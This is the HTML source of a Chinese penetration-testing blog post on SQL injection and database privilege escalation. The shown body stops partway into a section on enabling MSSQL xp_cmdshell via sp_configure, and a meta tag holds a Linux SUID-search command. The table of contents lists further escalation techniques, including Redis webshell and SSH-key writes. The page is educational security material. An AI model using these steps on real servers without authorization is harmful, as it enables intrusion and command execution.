@@ -1,0 +1,1277 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SQL注入 | 欢迎来到closeto的博客</title>
+  <meta name="keywords" content=" 2021 , Web ">
+  <meta name="description" content="SQL注入 | 欢迎来到closeto的博客">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="SUID提权查找S权限：find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null UID三类： 123S UID：授予文件权限，允许普通用户执行root文件Real UID：执行该进程的用户实际的UID，谁通过shell运行就是谁Effective UID：程序实际操作时生效的UID，一般在进程启动时，直接由Real UID复制而来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="https://closeto.github.io/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="欢迎来到closeto的博客">
+<meta property="og:description" content="SUID提权查找S权限：find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null UID三类： 123S UID：授予文件权限，允许普通用户执行root文件Real UID：执行该进程的用户实际的UID，谁通过shell运行就是谁Effective UID：程序实际操作时生效的UID，一般在进程启动时，直接由Real UID复制而来。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://closeto.github.io/images/image-20220913221850697.png">
+<meta property="og:image" content="https://closeto.github.io/images/image-20220912231256193.png">
+<meta property="og:image" content="https://closeto.github.io/images/image-20220912231817462.png">
+<meta property="article:published_time" content="2023-08-24T09:17:21.052Z">
+<meta property="article:author" content="closeto">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="2021">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://closeto.github.io/images/image-20220913221850697.png">
+
+
+<link rel="icon" href="/img/ico.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/user.png"/>
+</a>
+<div class="author">
+    <span>closeto</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/closeto"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:vou0515@gmail.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(38)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="Web安全">
+            
+            Web安全
+            <small>(17)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="内网安全">
+            
+            内网安全
+            <small>(10)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="Windows相关">
+            
+            Windows相关
+            <small>(4)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="Linux相关">
+            
+            Linux相关
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="其它">
+            
+            其它
+            <small>(3)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="考证学习">
+            
+            考证学习
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+    </div>
+    <div>
+        
+            <a class="about  "
+               target="_blank"
+                    
+               href="https://github.com/closeto">关于</a>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="38">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/url">名字列表</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>2021</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>2022</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>2023</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内网</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>软考</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>渗透测试</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件格式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>中级</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Bin</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ShellCode</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Web</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Windows</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Linux%E6%8F%90%E6%9D%83/"
+           data-tag="内网,渗透测试,2021"
+           data-author="" >
+            <span class="post-title" title="Linux提权">Linux提权</span>
+            <span class="post-date" title="2023-08-24 17:17:21">2023/08/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/24/WL%E7%AB%AF%E5%8F%A3%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title=""></span>
+            <span class="post-date" title="2023-08-24 14:33:17">2023/08/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 Linux相关 "
+           href="/2023/03/10/busybox%E6%90%AD%E5%BB%BA%E6%9C%80%E5%B0%8FLinux/"
+           data-tag="Linux,2023"
+           data-author="" >
+            <span class="post-title" title="Busybox搭建最小Linux">Busybox搭建最小Linux</span>
+            <span class="post-date" title="2023-03-10 12:30:00">2023/03/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 其它 "
+           href="/2022/07/19/Nginx%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F/"
+           data-tag="2022"
+           data-author="" >
+            <span class="post-title" title="Nginx日志格式">Nginx日志格式</span>
+            <span class="post-date" title="2022-07-19 00:00:00">2022/07/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 其它 "
+           href="/2022/05/07/UTF-8%E9%9D%9E%E6%9C%80%E7%9F%AD%E5%BD%A2%E5%BC%8F&%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"
+           data-tag="2022"
+           data-author="" >
+            <span class="post-title" title="UTF8编码安全">UTF8编码安全</span>
+            <span class="post-date" title="2022-05-07 00:00:00">2022/05/07</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/04/10/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E9%81%87/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相遇">ShellCode入门到放弃—相遇</span>
+            <span class="post-date" title="2022-04-10 19:30:00">2022/04/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/04/10/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E2%80%94%E7%AE%80%E4%BB%8B/"
+           data-tag="2022,文件格式"
+           data-author="" >
+            <span class="post-title" title="PE文件格式—简介">PE文件格式—简介</span>
+            <span class="post-date" title="2022-04-10 10:48:36">2022/04/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"
+           data-tag="2022,内网,渗透测试"
+           data-author="" >
+            <span class="post-title" title="Redis未授权">Redis未授权</span>
+            <span class="post-date" title="2022-03-10 14:30:00">2022/03/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/19/Linux%E7%97%95%E8%BF%B9%E6%93%A6%E9%99%A4/"
+           data-tag="2022,内网,渗透测试,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux痕迹擦除">Linux痕迹擦除</span>
+            <span class="post-date" title="2022-02-19 00:00:00">2022/02/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/18/Windows%E7%97%95%E8%BF%B9%E6%93%A6%E9%99%A4/"
+           data-tag="2022,内网,渗透测试,Windows"
+           data-author="" >
+            <span class="post-title" title="Windows痕迹擦除">Windows痕迹擦除</span>
+            <span class="post-date" title="2022-02-18 00:00:00">2022/02/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/14/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="2022,内网,渗透测试,Windows"
+           data-author="" >
+            <span class="post-title" title="Windows信息收集">Windows信息收集</span>
+            <span class="post-date" title="2022-02-14 00:00:00">2022/02/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/13/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="2022,内网,渗透测试,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux信息收集">Linux信息收集</span>
+            <span class="post-date" title="2022-02-13 00:00:00">2022/02/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/01/18/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E5%BC%83/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相弃">ShellCode入门到放弃—相弃</span>
+            <span class="post-date" title="2022-01-18 17:30:00">2022/01/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 考证学习 "
+           href="/2022/01/18/%E8%BD%AF%E8%80%83%E4%B8%AD%E7%BA%A7%E2%80%94%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"
+           data-tag="2023,软考,中级"
+           data-author="" >
+            <span class="post-title" title="软考中级—信息安全工程师">软考中级—信息安全工程师</span>
+            <span class="post-date" title="2022-01-18 14:30:00">2022/01/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/01/15/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E7%9F%A5/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相知">ShellCode入门到放弃—相知</span>
+            <span class="post-date" title="2022-01-15 12:12:12">2022/01/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2021/11/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96/"
+           data-tag="内网,渗透测试,2021"
+           data-author="" >
+            <span class="post-title" title="终端管理工具密码获取">终端管理工具密码获取</span>
+            <span class="post-date" title="2021-11-10 14:30:00">2021/11/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2021/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Linux%E5%8F%8D%E5%BC%B9Shell/"
+           data-tag="内网,渗透测试,2021"
+           data-author="" >
+            <span class="post-title" title="Linux反弹Shell">Linux反弹Shell</span>
+            <span class="post-date" title="2021-11-04 14:30:00">2021/11/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2021/10/19/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81NPS%E3%80%81FRP/"
+           data-tag="内网,渗透测试,2021"
+           data-author="" >
+            <span class="post-title" title="流量特征NPS、FRP">流量特征NPS、FRP</span>
+            <span class="post-date" title="2021-10-19 14:30:00">2021/10/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2021/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-docker%E6%9C%AA%E6%8E%88%E6%9D%83/"
+           data-tag="内网,渗透测试,2021"
+           data-author="" >
+            <span class="post-title" title="docker未授权">docker未授权</span>
+            <span class="post-date" title="2021-09-10 14:30:00">2021/09/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/07/25/web%E5%AE%89%E5%85%A8-Xpath%E6%B3%A8%E5%85%A5/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="Xpath注入">Xpath注入</span>
+            <span class="post-date" title="2021-07-25 00:00:00">2021/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/07/16/Web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="SQL注入">SQL注入</span>
+            <span class="post-date" title="2021-07-16 00:00:00">2021/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/06/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="文件上传漏洞">文件上传漏洞</span>
+            <span class="post-date" title="2021-06-19 00:00:00">2021/06/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/06/08/Web%E5%AE%89%E5%85%A8-PHP%E5%BA%8F%E5%88%97%E5%8C%96&%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="PHP序列化与反序列化">PHP序列化与反序列化</span>
+            <span class="post-date" title="2021-06-08 00:00:00">2021/06/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/06/04/Web%E5%AE%89%E5%85%A8-SSI%E6%B3%A8%E5%85%A5/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="SSI注入">SSI注入</span>
+            <span class="post-date" title="2021-06-04 00:00:00">2021/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2021/06/02/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"
+           data-tag="Linux,2021"
+           data-author="" >
+            <span class="post-title" title="Docker常用命令">Docker常用命令</span>
+            <span class="post-date" title="2021-06-02 00:00:00">2021/06/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/05/25/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞">文件包含漏洞</span>
+            <span class="post-date" title="2021-05-25 00:00:00">2021/05/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/04/19/Web%E5%AE%89%E5%85%A8-%E8%B6%8A%E6%9D%83/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="越权">越权</span>
+            <span class="post-date" title="2021-04-19 00:00:00">2021/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/04/06/Web%E5%AE%89%E5%85%A8-Xxe/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="XXE">XXE</span>
+            <span class="post-date" title="2021-04-06 00:00:00">2021/04/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/04/05/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="文件下载漏洞">文件下载漏洞</span>
+            <span class="post-date" title="2021-04-05 00:00:00">2021/04/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 其它 "
+           href="/2021/04/02/%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="2021"
+           data-author="" >
+            <span class="post-title" title="常用正则表达式">常用正则表达式</span>
+            <span class="post-date" title="2021-04-02 00:00:00">2021/04/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/25/Web%E5%AE%89%E5%85%A8-Nginx%E5%AE%89%E5%85%A8/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="Apache安全">Apache安全</span>
+            <span class="post-date" title="2021-03-25 00:00:00">2021/03/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/19/Web%E5%AE%89%E5%85%A8-LDAP%E6%B3%A8%E5%85%A5/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="LDAP注入">LDAP注入</span>
+            <span class="post-date" title="2021-03-19 00:00:00">2021/03/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/13/Web%E5%AE%89%E5%85%A8-CSR&SSRF/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="CSRF &amp; SSRF">CSRF &amp; SSRF</span>
+            <span class="post-date" title="2021-03-13 00:00:00">2021/03/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/09/Web%E5%AE%89%E5%85%A8-CRLF/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="CLRF">CLRF</span>
+            <span class="post-date" title="2021-03-09 00:00:00">2021/03/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/06/Web%E5%AE%89%E5%85%A8-Apache%E5%AE%89%E5%85%A8/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="Apache安全">Apache安全</span>
+            <span class="post-date" title="2021-03-06 00:00:00">2021/03/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/03/03/Web%E5%AE%89%E5%85%A8-IIS%E5%AE%89%E5%85%A8/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="IIS安全">IIS安全</span>
+            <span class="post-date" title="2021-03-03 00:00:00">2021/03/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/02/27/Web%E5%AE%89%E5%85%A8-XSS/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="XSS">XSS</span>
+            <span class="post-date" title="2021-02-27 00:00:00">2021/02/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 "
+           href="/2021/02/10/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"
+           data-tag="2021,Web"
+           data-author="" >
+            <span class="post-title" title="一句话木马">一句话木马</span>
+            <span class="post-date" title="2021-02-10 00:00:00">2021/02/10</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Web安全-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SQL注入</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web安全">Web安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">2021</a>
+            
+            <a class="color4">Web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        <!-- 修改了原始显示，原始显示更新日期为悬浮 -->
+        <!-- 
+            发布时间 : <time class="date" title='最后更新: 2023-08-24 17:29:19'>2021-07-16 00:00</time>
+         -->
+
+        
+            发布时间 : 2021-07-16 00:00</time>
+        <br>
+
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdshell%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-text">cmdshell提权操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sp-oacreate%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-text">sp_oacreate提权操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-text">沙盒提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-text">写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#into-outfile"><span class="toc-text">into_outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OS-Shell"><span class="toc-text">OS-Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ORACLE"><span class="toc-text">ORACLE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA"><span class="toc-text">Oracle用户创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-text">Oracle系统权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90"><span class="toc-text">查询角色权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%AE%9A%E4%B9%89%E8%A7%92%E8%89%B2"><span class="toc-text">预定义角色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORACLE%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86"><span class="toc-text">ORACLE角色管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">安全配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis"><span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C"><span class="toc-text">常用操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8A%A0%E5%9B%BA"><span class="toc-text">Redis加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#protected-mode%E8%AF%B4%E6%98%8E"><span class="toc-text">protected-mode说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">Redis未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5Webshell%E6%96%87%E4%BB%B6"><span class="toc-text">写入Webshell文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5"><span class="toc-text">写入SSH公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">写入计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">主从复制RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E4%B9%8B%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">SQL之预编译</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="/./images/sqlinject1.png" alt="1.png"></p>
+<p><strong>数据库权限划分：</strong></p>
+<p>管理员：root（SA）权限，具备所有操作</p>
+<p>对象拥有者：创建数据库对象的用户即为数据库对象也有着</p>
+<p>访问用户：对数据库进行增、删、改、查</p>
+<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="cmdshell提权操作"><a href="#cmdshell提权操作" class="headerlink" title="cmdshell提权操作"></a><strong>cmdshell提权操作</strong></h2><p><strong>前提条件：</strong></p>
+<p>​    1、账号拥有sysadmin属性即可（可以是SA、Administrator等高权限账户）</p>
+<p><strong>注意：</strong></p>
+<p>​        xp_cmdshell不能执行系统增、删账号的操作（无权限，相当于普通账户，即使时SA或Administrator也不行）</p>
+<p>​        不能通过xp_cmdshell写入文件，只能执行系统命令</p>
+<p>​        可以执行上传的C2</p>
+<p><strong>【实际示例】</strong></p>
+<p><strong>1、exec sp_configure ‘show advanced options’,1;</strong></p>
+<p>​    <img src="/./images/sqlinject11.png"></p>
+<p>​    解释：开启sp_configure中高级操作</p>
+<p>​    exec sp_configure ‘show advanced options’;    #查看sp_configure中高级选项的值</p>
+<p>​    sp_configure：显示或更改当前服务器的全局配置设置。</p>
+<p>​    show advanced options：显示高级选项，默认为0，要手动开启（开启可使用xp_cmdshell）</p>
+<p><strong>2、exec sp_configure ‘xp_cmdshell’,1;</strong></p>
+<p>​    <img src="/./images/sqlinject10.png"></p>
